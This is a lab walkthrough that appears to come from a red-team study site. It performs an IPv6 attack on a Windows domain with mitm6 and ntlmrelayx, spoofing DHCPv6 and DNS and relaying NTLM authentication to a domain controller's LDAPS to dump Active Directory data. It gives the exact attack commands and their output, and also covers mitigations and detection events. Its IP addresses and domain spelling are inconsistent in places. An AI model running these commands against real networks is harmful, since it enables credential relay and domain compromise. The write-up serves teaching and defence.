# IPv6 Attack with mitm6

**Date:** May 2026  
**Author:** ShahinSecLab  
**Category:** Network Attack / Credential Capture  
**Difficulty:** Easy  
**Tools:** mitm6, ntlmrelayx.py

## Table of Contents
1. [Overview](#overview)
2. [Attack Theory](#attack-theory)
3. [Lab Setup](#lab-setup)
4. [Tools Required](#tools-required)
5. [Attack Walkthrough](#attack-walkthrough)
   - [Step 1 — Start mitm6](#step-1--start-mitm6)
   - [Step 2 — Launch NTLM Relay](#step-2--launch-ntlm-relay)
   - [Step 3 — Trigger Authentication from Victim](#step-3--trigger-authentication-from-victim)
   - [Step 4 — Relay Succeeds & Loot Retrieved](#step-4--relay-succeeds--loot-retrieved)
   - [Step 5 — Explore Loot Folder](#step-6--explore-loot-folder)
   - [Step 6 — Credential & Domain Dump](#step-7--credential--domain-dump)
6. [Mitigations & Defenses](#mitigations--defenses)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

## Overview

`mitm6` is a tool that exploits a fundamental design decision in Windows networking: **IPv6 is preferred over IPv4 by default on modern Windows systems**.

In many corporate environments, IPv6 is enabled but not properly configured. In most cases, **no legitimate DHCPv6 or DNSv6 server exists**, which creates a security gap. Attackers can abuse this gap to position themselves as the **authoritative DNS server** for an entire network segment.

When combined with Impacket’s `ntlmrelayx`, this technique becomes a powerful Active Directory attack chain:

- Capture NTLM authentication from Windows machines on the network
- Relay captured authentication to services such as **LDAP/LDAPS** on a Domain Controller
- Create new domain users or extract Active Directory data
- Relay to SMB services to access file shares or execute commands
- Ultimately escalate privileges and potentially achieve **Domain Admin access without cracking passwords**


## Attack Theory

Why IPv6?

Windows machines periodically broadcast DHCPv6 Solicit messages looking for an IPv6 gateway and DNS server. By default, these go unanswered on most enterprise networks. mitm6 responds to these broadcasts, assigning the attacker's link-local IPv6 address as the DNS server.

```
Victim     → DNS: "Where is wpad.corp.local?"
mitm6      → DNS: "It's at attacker's IP"
Victim     → HTTP: GET http://attacker/wpad.dat
ntlmrelayx → "Authenticate with NTLM!"
Victim     → [Sends NTLM handshake]
ntlmrelayx → [Relays to DC's LDAP]
DC         → [Authenticated!]
```

<!-- ## Full Kill Chain
```
DHCPv6 Spoofing
      ↓
DNS Hijack (WPAD / internal names)
      ↓
NTLM Authentication Capture
      ↓
NTLM Relay → LDAP / SMB on Domain Controller
      ↓
Create Domain User / Dump AD / Execute Commands
      ↓
Domain Compromise
``` -->

## Lab Setup

```
| Machine   | Role                | OS                  | IP Address      |
|-----------|---------------------|---------------------|-----------------|
| Attacker  | Attacker            | Kali Linux          | 192.168.5.128   |
| Server    | Domain Controller   | Windows Server 2019 | 192.168.5.134   |
| Victim    | Victim Workstation  | Windows 10          | 192.168.5.135   |
```

**Domain Name:** `readteambd.local`

## Tools Required

```
|      Tool       |                  Purpose                           |
|-----------------|----------------------------------------------------|
| mitm6           | DHCPv6 spoofing + DNS hijacking                    |
| ntlmrelayx.py   | NTLM authentication relay                          |
| secretsdump.py  | Remote credential extraction from Active Directory |
```

# Attack Walkthrough

## Step 1 — Start mitm6

Open Terminal 1. Launch mitm6 targeting the internal domain on the network interface connected to the LAN.

```bash
sudo mitm6 -d readteambd.local -i eth0
```

```
| Flag |           Meaning                 |
|------|-----------------------------------|
| sudo | Run with root privileges          |
| mitm6| Starts IPv6 spoofing (DHCPv6/DNS) |
| -d   | Target domain                     |
| -i   | Network interface                 |
| eth0| Active LAN interface               |
```

### What Happens (mitm6 Flow)

- `mitm6` listens for **DHCPv6 Solicit** packets from Windows hosts  
- It replies with **DHCPv6 Advertise/Reply**, setting itself as the IPv6 DNS server  
- Victim machines automatically update their DNS configuration  
- All DNS queries are redirected to the attacker-controlled system  
- `mitm6` responds to **WPAD and internal domain queries**, forcing traffic toward the attacker IP  


## mitm6 output:

```
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:77:a3:b1]
IPv4 address: 192.168.5.128
IPv6 address: fe80::f0be:d0bb:2c16:64f0
DNS local search domain: readteambd.local
DNS allowlist: readteambd.local
IPv6 address fe80::74:1 is now assigned to mac=00:50:56:c0:00:08 host=R64M. ipv4=
IPv6 address fe80::192:168:5:134 is now assigned to mac=00:0c:29:bc:6b:1e host=REDTEAMBD-DC.READTEAMBD.local. ipv4=192.168.5.134
Sent spoofed reply for wpad.readteambd.local. to fe80::502e:c6be:1fe9:c8bf
```

<p align="center">
  <img src="/writeups/03-IPv6 attack with mitm6/images/step1.png" width="600">
</p>

## Step 2 — Launch ntlmrelayx:
On another terminal
Run:

```bash
ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootme
```
```
|             Flag              |                      Meaning                         |
|-------------------------------|------------------------------------------------------|
| ntlmrelayx.py                 | NTLM authentication relay                            |
| -6                            | Enables listening on IPv6 as well as IPv4            |
| -t ldaps://192.168.5.130      | Relay target (LDAPS on Domain Controller)            |
| -wh fakewpad.readteambd.local | Serves a fake WPAD hostname to trigger authentication|
|-l lootme                      | Saves all captured/dumped data to local directory    |
```

## ntlmrelayx startup output:

```
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
```

<p align="center">
  <img src="/writeups/03-IPv6 attack with mitm6/images/step2.png" width="600">
</p>

## Step 3 — Trigger Authentication from Victim

On the victim machine (Windows 10), simply restart the machine.
Windows will automatically:

```
1. Send a DHCPv6 Solicit — mitm6 responds
2. Query DNS for WPAD — mitm6 answers, pointing to the attacker
3. Windows attempts to fetch http://fakewpad.roadteambd.local/wpad.dat
4. ntlmrelayx demands NTLM authentication
5. Windows transparently authenticates using the logged-in user's credentials
```

> *"No user interaction is required once the victim logs into Windows. The attack is completely silent."*

## Step 4 — Relay Succeeds & Loot Retrieved

When the victim machine sends an authentication request, `ntlmrelayx` receives it and relays it to the Domain Controller’s LDAP service.

Example output:

```text
[*] HTTPD(80): Connection from 192.168.5.135 controlled, attacking target ldaps://192.168.5.134
[*] HTTPD(80): Authenticating against ldaps://192.168.5.134 as readteambd\victim-1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains...
[*] Dumping domain info for first time
[*] Domain info dumped into lootme!
```

After a successful relay, domain information is saved in the `lootme` directory.

<p align="center">
  <img src="/writeups/03-IPv6 attack with mitm6/images/step3.png" width="600">
</p>

## Step 5 — Explore Loot Folder
Navigate to the ./lootme directory created by ntlmrelayx. It contains structured LDAP dump files:

```
lootme/
├── domain_computers.html
├── domain_computers_by_os.html
├── domain_groups.html
├── domain_policy.html
├── domain_trusts.html
├── domain_users.html
├── domain_users_by_group.html
└── domain_users.grep
```
Open domain_users_by_group.html

<p align="center">
  <img src="/writeups/03-IPv6 attack with mitm6/images/step5-1.png" width="600">
</p>
<p align="center">
  <img src="/writeups/03-IPv6 attack with mitm6/images/step5-2.png" width="600">
</p>
<p align="center">
  <img src="/writeups/03-IPv6 attack with mitm6/images/step5-3.png" width="600">
</p>


## Mitigation / Defense

```
1. Disable IPv6 if Not in Use
2. Block DHCPv6 Traffic at the Network Level
3. Enforce LDAP Signing & Channel Binding
4. Enable SMB Signing
5. Disable WPAD via Group Policy
6. Restrict NTLM Authentication
```

## Key Takeaways

- IPv6 is enabled by default on all modern Windows systems — even in environments that never intentionally configured it, making this attack surface invisible to most defenders.

- mitm6 requires no credentials to launch. An unauthenticated attacker on the same network segment can begin poisoning DNS responses immediately.

- The attack chain is silent. Windows machines will automatically reach out to the rogue DHCPv6 server without any user interaction — the victim doesn't click anything.

- NTLM relay is the real payload. mitm6 alone is just the entry point — the captured credentials relayed via ntlmrelayx are what give the attacker persistence, lateral movement, and potentially Domain Admin.

- A single misconfiguration enables full domain compromise. If LDAP signing is not enforced and IPv6 is not blocked, an attacker can go from zero to Domain Admin in minutes.

- Defense-in-depth is required. No single fix stops this attack entirely — you need to disable DHCPv6, enforce LDAP signing, enable SMB signing, and disable WPAD together.

- This attack is well-known and still widely unpatched. First published by Fox-IT in 2018, it remains highly effective in real-world red team engagements today because IPv6 hardening is still overlooked in most AD environments.

- Detection is possible but often missed. Event IDs 4624 and 4742, unexpected machine account creation, and rogue DHCPv6 traffic are all detectable — but only if you're actively monitoring for them.

## References

| # | Resource |
|---|---|
| 1 | [mitm6 – Compromising IPv4 Networks via IPv6 — Fox-IT (original research)](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) |
| 2 | [mitm6 GitHub Repository — dirkjanm](https://github.com/dirkjanm/mitm6) |
| 3 | [ntlmrelayx — Impacket by SecureAuth](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx) |
| 4 | [Impacket GitHub Repository — fortra](https://github.com/fortra/impacket) |
| 5 | [The Most Dangerous User Account You've Never Heard Of — SpectreOps](https://posts.specterops.io/the-most-dangerous-user-account-you-ve-never-heard-of-196c50e83d32) |
| 6 | [Mitigating mitm6 — Microsoft Security Blog](https://techcommunity.microsoft.com/t5/microsoft-security-blog/mitm6-who-is-this/ba-p/2292417) |
| 7 | [LDAP Channel Binding and LDAP Signing — Microsoft KB4520412](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a) |
| 8 | [Active Directory Security — adsecurity.org](https://adsecurity.org/) |
| 9 | [MITRE ATT&CK — T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) |

